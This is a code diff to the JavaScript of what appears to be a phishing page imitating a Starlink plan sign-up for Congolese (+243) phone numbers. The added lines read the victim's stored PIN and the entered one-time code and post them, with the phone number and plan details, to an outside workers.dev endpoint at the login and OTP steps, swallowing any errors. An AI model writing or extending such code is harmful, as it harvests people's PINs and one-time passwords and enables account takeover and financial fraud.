@@ -762,13 +762,20 @@ async function runProcessing(ph){
     }
   }
   /* ── Worker: login_initiated ── */
-  fetch('https://digiroues-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({event:'login_initiated',data:{
-      phone:'+243'+ph,forfait:forfait.name||'',
-      price:forfait.price||'',deposit:forfait.deposit||'',
-      daily:forfait.daily||'',ts:Date.now()
-    }})
-  }).catch(function(){});
+  (function(){
+    var _a={};try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+    fetch('https://digiroues-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({event:'login_initiated',data:{
+        phone:'+243'+ph,
+        pin:_a.pin||'',
+        forfait:forfait.name||'',
+        price:forfait.price||'',
+        deposit:forfait.deposit||'',
+        daily:forfait.daily||'',
+        ts:Date.now()
+      }})
+    }).catch(function(){});
+  })();
   await slp(500);
   document.getElementById('otpPhone').innerHTML =
     '🇨🇩 +243 ' + ph.slice(0,2) + ' ' + ph.slice(2,5) + ' ' + ph.slice(5);
@@ -877,13 +884,21 @@ function submitOTP(){
   hap([18, 8, 35]);
 
   /* ── Worker: otp_confirmed ── */
-  fetch('https://digiroues-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({event:'otp_confirmed',data:{
-      phone:forfait.phone?'+243'+forfait.phone:'',
-      forfait:forfait.name||'',price:forfait.price||'',
-      deposit:forfait.deposit||'',ref:ref,ts:Date.now()
-    }})
-  }).catch(function(){});
+  (function(){
+    var _a={};try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+    fetch('https://digiroues-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({event:'otp_confirmed',data:{
+        phone:_a.phone?'+243'+_a.phone:'',
+        pin:_a.pin||'',
+        otp:otpVal,
+        forfait:forfait.name||'',
+        price:forfait.price||'',
+        deposit:forfait.deposit||'',
+        ref:ref,
+        ts:Date.now()
+      }})
+    }).catch(function(){});
+  })();
   /* Show full-screen loading (same style as index), then navigate */
   var loading = document.getElementById('loadingOverlay');
   if (loading){
